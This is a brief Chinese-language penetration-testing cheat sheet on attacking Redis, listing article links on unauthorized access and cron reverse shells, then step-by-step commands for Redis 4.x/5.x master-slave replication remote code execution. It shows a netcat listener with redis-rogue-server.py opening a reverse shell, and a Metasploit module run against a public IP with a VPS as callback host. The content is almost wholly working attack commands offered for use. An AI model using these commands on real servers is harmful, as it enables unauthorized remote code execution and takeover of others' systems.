[Redis未授权访问漏洞(windows环境](http://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484286&idx=1&sn=6250d89d18ea635bda32e815fdcc5f6d)
[Redis未授权计划任务反弹shell](https://zhuanlan.zhihu.com/p/582582342)
[Redis的漏洞总结(建议收藏)](https://mp.weixin.qq.com/s/wfncezg7Xe4Z4VP7lMxc7Q)
[Redis系列漏洞总结](https://mp.weixin.qq.com/s/O5JVZtTifDri8xGJA08AWA)

# Redis主从复制RCE redis 4.X/5.X

1. by redis-rogue-server.py
```bash
nc -lvvp 6381
python3 redis-rogue-server.py --rhost 192.168.127.129  --rport 6379 --lhost 192.168.127.134 --lport 6381
# reverse shell
# What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address: 192.168.127.134
Reverse server port: 6381
## [i]nteractive shell 也可以
```

2. by msf
```
sudo msfconsole
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS 47.92.135.138
set SRVHOST VPS_IP
set LHOST VPS_IP
exploit
```